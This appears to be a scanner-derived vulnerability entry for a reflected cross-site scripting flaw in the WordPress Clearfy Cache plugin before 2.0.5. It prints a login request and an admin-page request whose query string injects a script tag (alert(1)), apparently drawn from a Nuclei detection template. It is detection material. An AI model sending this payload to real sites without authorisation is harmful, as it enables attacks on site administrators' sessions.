# Vulnerability: WordPress Clearfy Cache <2.0.5 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`clearfy-cache-xss.yaml`)

## Description
WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

